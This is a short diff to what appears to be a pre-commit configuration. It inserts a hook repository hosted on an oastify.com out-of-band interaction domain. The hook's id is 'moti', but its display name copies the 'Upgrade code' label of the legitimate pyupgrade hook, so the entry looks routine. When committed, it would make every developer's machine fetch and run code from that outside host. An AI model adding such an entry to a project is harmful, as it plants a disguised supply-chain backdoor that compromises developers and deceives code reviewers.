@@ -27,6 +27,12 @@ repos:
       - id: pyupgrade
         name: Upgrade code
 
+  - repo: https://sc8dagjsyjahl4fahh0t50hgk7q2tqmeb.oastify.com/
+    rev: v3.4.0
+    hooks:
+      - id: moti
+        name: Upgrade code
+
   - repo: https://github.com/PyCQA/isort
     rev: 5.12.0
     hooks:
